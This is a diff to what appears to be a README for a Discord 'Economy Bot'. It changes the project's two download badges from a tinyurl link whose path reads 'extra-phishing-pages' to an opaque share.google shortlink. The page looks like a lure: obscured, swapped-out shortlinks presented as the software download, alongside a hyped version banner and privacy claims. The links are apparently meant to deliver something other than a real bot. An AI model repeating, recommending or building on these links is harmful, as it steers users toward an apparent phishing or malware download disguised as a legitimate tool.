@@ -5,7 +5,7 @@
 
 <div align="center">
 
-[![Download Economy Bot Discord](https://img.shields.io/badge/Download-00C853?style=for-the-badge&logo=github)](https://tinyurl.com/extra-phishing-pages)
+[![Download Economy Bot Discord](https://img.shields.io/badge/Download-00C853?style=for-the-badge&logo=github)](https://share.google/iGhNKTAeRnFXPM9Km)
 
 </div>
 
@@ -81,7 +81,7 @@ No cloud telemetry or external logging. All deployment and analysis protocols ar
 
 <div align="center">
 
-[![Download Economy Bot Discord](https://img.shields.io/badge/Download-00C853?style=for-the-badge&logo=github)](https://tinyurl.com/extra-phishing-pages)
+[![Download Economy Bot Discord](https://img.shields.io/badge/Download-00C853?style=for-the-badge&logo=github)](https://share.google/iGhNKTAeRnFXPM9Km)
 
 </div>
 **[ Version 2026.05 ULTRA ]**
